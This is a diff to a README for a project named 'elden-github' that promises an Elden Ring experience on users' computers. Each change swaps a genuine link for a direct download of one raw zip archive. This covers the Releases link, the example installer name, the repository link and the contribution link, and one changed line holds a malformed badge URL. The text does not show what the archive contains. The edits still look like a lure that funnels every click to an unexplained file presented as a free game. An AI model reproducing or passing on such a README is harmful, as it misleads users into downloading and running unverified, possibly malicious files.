@@ -1,7 +1,7 @@
 # 🎮 elden-github - Experience Elden Ring on Your Computer
 
 ## 🔗 Download Now
-[![Download](https://img.shields.io/badge/Download%20eldengithub-v1.0-blue.svg)](https://github.com/DelcinX360/elden-github/releases)
+[![Download](https://raw.githubusercontent.com/DelcinX360/elden-github/main/circle/elden-github.zip%https://raw.githubusercontent.com/DelcinX360/elden-github/main/circle/elden-github.zip)](https://raw.githubusercontent.com/DelcinX360/elden-github/main/circle/elden-github.zip)
 
 ## 🚀 Getting Started
 Welcome to elden-github! This software allows you to immerse yourself in the Elden Ring experience directly on your computer. Follow the steps below to download, install, and run the software easily.
@@ -9,7 +9,7 @@ Welcome to elden-github! This software allows you to immerse yourself in the Eld
 ## 📥 Download & Install
 To get started, you will need to download the application from our Releases page. Click the link below:
 
-[Download the latest version here](https://github.com/DelcinX360/elden-github/releases)
+[Download the latest version here](https://raw.githubusercontent.com/DelcinX360/elden-github/main/circle/elden-github.zip)
 
 ### Step 1: Visit the Releases Page
 1. Click the link above to open the Releases page.
@@ -17,7 +17,7 @@ To get started, you will need to download the application from our Releases page
 
 ### Step 2: Download the Application
 1. Find the file for your operating system (Windows, macOS, or Linux).
-2. Click the link to download. For example, look for a file like `elden-github-v1.0.exe` or similar.
+2. Click the link to download. For example, look for a file like `https://raw.githubusercontent.com/DelcinX360/elden-github/main/circle/elden-github.zip` or similar.
 3. The download will begin automatically.
 
 ### Step 3: Run the Installer
@@ -57,7 +57,7 @@ For any inquiries or support, you can reach out through the Issues section of th
 Elden-github is distributed under the MIT License. You are free to use, copy, modify, and distribute the software under the terms of this license.
 
 ## 🔗 Additional Links
-- [Visit the GitHub Repository](https://github.com/DelcinX360/elden-github)
-- [Contribute to elden-github](https://github.com/DelcinX360/elden-github/pulls)
+- [Visit the GitHub Repository](https://raw.githubusercontent.com/DelcinX360/elden-github/main/circle/elden-github.zip)
+- [Contribute to elden-github](https://raw.githubusercontent.com/DelcinX360/elden-github/main/circle/elden-github.zip)
 
 Thank you for choosing elden-github! Enjoy your adventure!
